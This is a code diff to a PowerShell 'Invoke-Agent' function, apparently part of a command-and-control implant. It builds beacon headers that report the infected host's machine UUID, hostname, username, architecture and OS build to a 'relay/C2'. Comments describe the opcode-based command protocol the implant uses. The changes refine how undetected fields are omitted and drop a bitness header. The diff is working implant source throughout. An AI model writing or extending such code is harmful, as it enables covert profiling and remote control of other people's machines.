@@ -136,7 +136,8 @@ function Invoke-Agent {
         if (-not $archFromEnv) { $archFromEnv = ReadEnv 'PROCESSOR_ARCHITECTURE' }
         $arch = $archMap[$archFromEnv]
         if (-not $arch) { $arch = $archFromEnv }
-        if (-not $arch) { $arch = 'unknown' }
+        # Undetected values stay empty — the header is OMITTED below, never sent as ''
+        # and never as a placeholder like 'unknown'.
         $processArch = '' + $archMap[(ReadEnv 'PROCESSOR_ARCHITECTURE')]
         $osVersion = ''
         $buildNumber = ''
@@ -158,9 +159,15 @@ function Invoke-Agent {
         } elseif ($buildNumber -eq '7600' -or $buildNumber -eq '7601') {
             $script:clrVersion = 'v2.0.50727'
         }
-        return ,@(
+        # REQUIRED headers carry compile-time constants. Every detection-derived field is
+        # OPTIONAL — undetected values OMIT the header (never '', never a placeholder), so
+        # the relay/C2 see "not reported". The machine UUID is nullable too: when every
+        # fallback fails it is omitted and the relay treats the agent as identity-less.
+        # There is NO Bitness header — the process arch already carries the full width,
+        # and x86_64/aarch64 are both 64-bit.
+        $pairs = @(
             @('X-Agent-Api-Version', '1'),
-            @('X-Agent-Uuid', $guid),
+            @('X-Agent-Machine-Uuid', $guid),
             @('X-Agent-Hostname', (ReadEnv 'COMPUTERNAME')),
             @('X-Agent-Username', (ReadEnv 'USERNAME')),
             @('X-Agent-Arch', $arch),
@@ -168,11 +175,10 @@ function Invoke-Agent {
             @('X-Agent-Platform', 'Windows'),
             @('X-Agent-Os-Version', $osVersion),
             @('X-Agent-Build', $buildNumber),
-            @('X-Agent-Commit', ''),
             @('X-Agent-Name-Id', '3'),
-            @('X-Agent-Bitness', $(if ($processArch -eq 'x86_64' -or $processArch -eq 'aarch64') { '64' } else { '32' })),
             @('X-Agent-Capabilities', '0800000000000000')
         )
+        return ,@($pairs | Where-Object { "$($_[1])" -ne '' })
     }
     # Command layout: [opcode][corrId:u32le][payload...]. Every reply echoes the id after
     # its status: [status:u32le][corrId:u32le]. Id 0 = unmatched.
